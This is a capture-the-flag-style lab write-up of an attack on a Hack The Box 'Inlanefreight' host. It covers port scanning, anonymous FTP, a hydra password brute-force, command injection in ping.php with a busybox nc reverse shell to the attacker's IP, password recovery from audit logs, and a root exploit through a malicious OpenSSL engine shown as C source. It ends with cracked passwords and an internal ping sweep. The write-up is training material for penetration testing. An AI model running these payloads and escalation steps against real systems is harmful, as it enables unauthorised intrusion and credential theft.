# Attacking Enterprise Networks

| **External Testing**                       | **Internal Testing**                          |
| ------------------------------------------ | --------------------------------------------- |
| 10.129.x.x ("external" facing target host) | 172.16.8.0/23                                 |
| \*.inlanefreight.local (all subdomains)    | 172.16.9.0/23                                 |
|                                            | INLANEFREIGHT.LOCAL (Active Directory domain) |

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ sudo nmap -sC -sV -T4 -p- -O 10.129.124.13

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.78
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp   open  domain   (unknown banner: 1337_HTB_DNS)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    1337_HTB_DNS
| dns-nsid: 
|_  bind.version: 1337_HTB_DNS
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Inlanefreight
|_http-server-header: Apache/2.4.41 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES PIPELINING CAPA STLS TOP UIDL AUTH-RESP-CODE SASL
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
143/tcp  open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: LOGIN-REFERRALS have LITERAL+ more capabilities SASL-IR STARTTLS OK post-login listed ID IMAP4rev1 LOGINDISABLEDA0001 IDLE Pre-login ENABLE
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS have LITERAL+ capabilities SASL-IR ENABLE OK more post-login ID IMAP4rev1 listed IDLE AUTH=PLAINA0001 Pre-login
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES PIPELINING CAPA USER TOP UIDL AUTH-RESP-CODE SASL(PLAIN)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
8080/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Support Center
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

### 21 - FTP

Anonymous access allowed

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ ftp 10.129.124.13                                                                                                                                 
Connected to 10.129.124.13.
220 (vsFTPd 3.0.3)
Name (10.129.124.13:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||45765|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
226 Directory send OK.
ftp> get flag.txt 
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||48772|)
150 Opening BINARY mode data connection for flag.txt (38 bytes).
100% |***********************************************************************************************************************************************************************************************|    38       21.65 KiB/s    00:00 ETA
226 Transfer complete.
```

```
HTB{0eb0ab788df18c3115ac43b1c06ae6c4}
```

### 80 - HTTP

No subdomains

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ dirsearch -u http://inlanefreight.htb   
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Downloads/AEN/reports/http_inlanefreight.htb/_25-12-12_16-48-25.txt

Target: http://inlanefreight.htb/

[16:48:25] Starting:                                                                                                                                                                                                                        
[16:48:27] 403 -  282B  - /.ht_wsr.txt                                      
[16:48:27] 403 -  282B  - /.htaccess.orig                                   
[16:48:27] 403 -  282B  - /.htaccess.sample                                 
[16:48:27] 403 -  282B  - /.htaccess.save
[16:48:27] 403 -  282B  - /.htaccess.bak1
[16:48:27] 403 -  282B  - /.htaccess_orig
[16:48:27] 403 -  282B  - /.htaccess_extra
[16:48:27] 403 -  282B  - /.htaccess_sc                                     
[16:48:27] 403 -  282B  - /.htaccessOLD                                     
[16:48:27] 403 -  282B  - /.htaccessOLD2                                    
[16:48:27] 403 -  282B  - /.htaccessBAK
[16:48:27] 403 -  282B  - /.htm                                             
[16:48:27] 403 -  282B  - /.html
[16:48:27] 403 -  282B  - /.htpasswd_test                                   
[16:48:27] 403 -  282B  - /.htpasswds
[16:48:27] 403 -  282B  - /.httr-oauth                                      
[16:48:28] 403 -  282B  - /.php                                             
[16:48:33] 200 -    3KB - /about.html                                       
[16:48:42] 200 -    3KB - /contact.html                                     
[16:48:43] 301 -  320B  - /css  ->  http://inlanefreight.htb/css/           
[16:48:45] 200 -    2KB - /error.html                                       
[16:48:46] 301 -  322B  - /fonts  ->  http://inlanefreight.htb/fonts/       
[16:48:46] 200 -    2KB - /gallery.html                                     
[16:48:47] 301 -  323B  - /images  ->  http://inlanefreight.htb/images/     
[16:48:47] 200 -  609B  - /images/                                          
[16:48:52] 301 -  327B  - /monitoring  ->  http://inlanefreight.htb/monitoring/
[16:48:52] 200 -   56B  - /monitoring/                                      
[16:48:58] 403 -  282B  - /server-status/                                   
[16:48:58] 403 -  282B  - /server-status
```

Monitoring page ⇒ we need creds

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F1n8JwWhOJSIoimQc8duo%2Fimage.png?alt=media&#x26;token=93f6c99d-a212-4642-a097-a258e3a5191b" alt=""><figcaption></figcaption></figure>

Fuzz more in the monitoring directory ⇒ js directory

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ dirsearch -u http://inlanefreight.htb/monitoring 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Downloads/AEN/reports/http_inlanefreight.htb/_monitoring_25-12-12_16-51-32.txt

Target: http://inlanefreight.htb/

[16:51:32] Starting: monitoring/                                                                                                                                                                                                            
[16:51:34] 301 -  330B  - /monitoring/js  ->  http://inlanefreight.htb/monitoring/js/
[16:51:35] 403 -  282B  - /monitoring/.htaccess.bak1                        
[16:51:35] 403 -  282B  - /monitoring/.ht_wsr.txt                           
[16:51:35] 403 -  282B  - /monitoring/.htaccess.sample                      
[16:51:35] 403 -  282B  - /monitoring/.htaccess.orig                        
[16:51:35] 403 -  282B  - /monitoring/.htaccess.save
[16:51:35] 403 -  282B  - /monitoring/.htaccess_extra                       
[16:51:35] 403 -  282B  - /monitoring/.htaccessOLD2
[16:51:35] 403 -  282B  - /monitoring/.htaccess_sc
[16:51:35] 403 -  282B  - /monitoring/.htaccessBAK
[16:51:35] 403 -  282B  - /monitoring/.htaccess_orig
[16:51:35] 403 -  282B  - /monitoring/.htaccessOLD
[16:51:35] 403 -  282B  - /monitoring/.htm                                  
[16:51:35] 403 -  282B  - /monitoring/.html
[16:51:35] 403 -  282B  - /monitoring/.httr-oauth                           
[16:51:35] 403 -  282B  - /monitoring/.htpasswds                            
[16:51:35] 403 -  282B  - /monitoring/.htpasswd_test                        
[16:51:37] 403 -  282B  - /monitoring/.php                                  
[16:51:52] 301 -  331B  - /monitoring/css  ->  http://inlanefreight.htb/monitoring/css/
[16:51:58] 301 -  331B  - /monitoring/img  ->  http://inlanefreight.htb/monitoring/img/
[16:51:59] 200 -  524B  - /monitoring/js/                                   
[16:52:00] 200 -  284B  - /monitoring/login.php
```

Main.js

```js
"use strict";

/**
 * Configs
 */
var configs = (function () {
    var instance;
    var Singleton = function (options) {
        var options = options || Singleton.defaultOptions;
        for (var key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        general_help: "",
        ls_help: "",
        cat_help: "",
        whoami_help: "",
        date_help: "",
        help_help: "",
        clear_help: "",
        reboot_help: "",
        cd_help: "",
        mv_help: "",
        rm_help: "",
        rmdir_help: "",
        touch_help: "",
        sudo_help: "",
		
        welcome: "INLANEFREIGHT ADMIN",
        welcome_file_name: "",
        invalid_command_message: "<value>: command not found.",
        reboot_message: "Preparing to reboot...\n\n3...\n\n2...\n\n1...\n\nRebooting...\n\n",
        permission_denied_message: "Unable to '<value>', permission denied.",
        sudo_message: "ping",
        usage: "Usage",
        file: "file",
        file_not_found: "File '<value>' not found.",
        username: "Username",
        hostname: "Host",
        platform: "Platform",
        accesible_cores: "Accessible cores",
        language: "Language",
        value_token: "<value>",
        host: "inlanefreight",
        user: "admin",
        is_root: false,
        type_delay: 20
    };
    
var files = (function () {
    var instance;
    var Singleton = function (options) {
        var options = options || Singleton.defaultOptions;
        for (var key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        "todo.txt": "[x] Remove staging files\n  [x] Configure Authentication",
		
        "note.txt": "We are yet to configure the authentication service.\n All devs are requested to test their application in Development mode inside Portainer before pushing it to production.",
       
	   
	   "contact.txt": "admin@inlanefreight.local"
```

#### Credentials brute force

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt inlanefreight.htb http-post-form "/monitoring/login.php:username=^USER^&password=^PASS^:F=Invalid" 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-12 16:59:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://inlanefreight.htb:80/monitoring/login.php:username=^USER^&password=^PASS^:F=Invalid
[STATUS] 2125.00 tries/min, 2125 tries in 00:01h, 14342274 to do in 112:30h, 16 active
[80][http-post-form] host: inlanefreight.htb   login: admin   password: 12qwaszx
```

admin:12qwaszx

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FnDVqfc16zCg8FVwtGFAN%2Fimage.png?alt=media&#x26;token=50b497ca-acfa-4683-9629-c6209d52d981" alt=""><figcaption></figcaption></figure>

The command connection\_test does a GET request to ping.php with a parameter

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FVA93DFVnb1ijm4ZxjVD9%2Fimage.png?alt=media&#x26;token=228a8880-5866-4106-ac67-b2de42bda95e" alt=""><figcaption></figcaption></figure>

Intercept the request with burp

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FFWO7Ql2mknplTgXMqnbI%2Fimage.png?alt=media&#x26;token=d4debb30-46f1-446d-a361-297f99a43c55" alt=""><figcaption></figcaption></figure>

If we put a semi colon

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FU5ngwivaQOFOYYO9SBEz%2Fimage.png?alt=media&#x26;token=4dcba10d-ec11-465b-8b04-c46930b0b94a" alt=""><figcaption></figcaption></figure>

With a new line we get command execution

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FgdoWU4YACYnzD8x1V7Zs%2Fimage.png?alt=media&#x26;token=decc8695-c69c-44a7-82a9-28f50a61753a" alt=""><figcaption></figcaption></figure>

Space is also filtered

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FiK7dgwd3rdr4LQF23DPE%2Fimage.png?alt=media&#x26;token=0c135a0a-e868-4d27-8b58-3bab5e42942a" alt=""><figcaption></figcaption></figure>

```
HTB{bdd8a93aff53fd63a0a14de4eba4cbc1}
```

nc is filtered

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FGTI2wgHGHDhC78RqDfH9%2Fimage.png?alt=media&#x26;token=40096834-60c6-4fb2-9e58-b1e4aaf2d10f" alt=""><figcaption></figcaption></figure>

We get a reverse shell with the following

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FCXsdtkXrTbAjQwkqJTvc%2Fimage.png?alt=media&#x26;token=7585562a-a757-485b-aec0-48926c1640f6" alt=""><figcaption></figcaption></figure>

```shellscript
/monitoring/ping.php?ip=127.0.0.1%0abusybox%09n$@c%0910.10.15.78%099001%09-e%09bash
```

#### Reverse shell

We are part of the adm group ⇒ we can read logs

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ penelope -p 9001       
[+] Listening for reverse shells on 0.0.0.0:9001 →  127.0.0.1 • 192.168.198.134 • 172.19.0.1 • 172.20.0.1 • 172.17.0.1 • 172.18.0.1 • 10.10.15.78
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from dmz01~10.129.124.13-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/dmz01~10.129.124.13-Linux-x86_64/2025_12_12-18_03_58-850.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
webdev@dmz01:/var/www/html/monitoring$ id 
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

bash history file

```shellscript
webdev@dmz01:/home/webdev$ cat .bash_history
su srvadm
ssh srvadm@localhost
su srvadm
exit
su srvadm
exit
su srvadm
exit
```

```shellscript
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>                                                                                                                                                                                
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
```

We can use that password to login with srvadm

```shellscript
$ id 
uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
$ sudo -l
Matching Defaults entries for srvadm on dmz01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl
```

```shellscript
b447c27a00e3a348881b0030177000cd
```

We have sudo privs over openssl

We make the following c code

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ cat exp.c     
#include <openssl/engine.h>
#include <unistd.h>
#include <sys/types.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0); setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

Compile it into a shared object

```shellscript
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ gcc -fPIC -o exploit.o -c exp.c
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/AEN]
└─$ gcc -shared -o exploit.so -lcrypto exploit.o
```

Transfer it to the target and run

```shellscript
srvadm@dmz01:~$ sudo openssl req -engine ./exploit.so
root@dmz01:/home/srvadm# id 
uid=0(root) gid=0(root) groups=0(root)
```

```shellscript
a34985b5976072c3c148abc751671302
```

Looking at /etc/shadow, let's try to crack user hashes

tom:Welcome1

pixel:letmein

srvadm:ILFreightnixadm!

Ping sweep

```shellscript
root@dmz01:/var# for i in {1..254} ;do (ping -c 1 172.16.8.$i | grep "bytes from" &) ;done
64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=2.07 ms
64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=2.01 ms
64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=1.91 ms
64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.023 ms
```

Now we need to establish a pivot to get access to the internal network
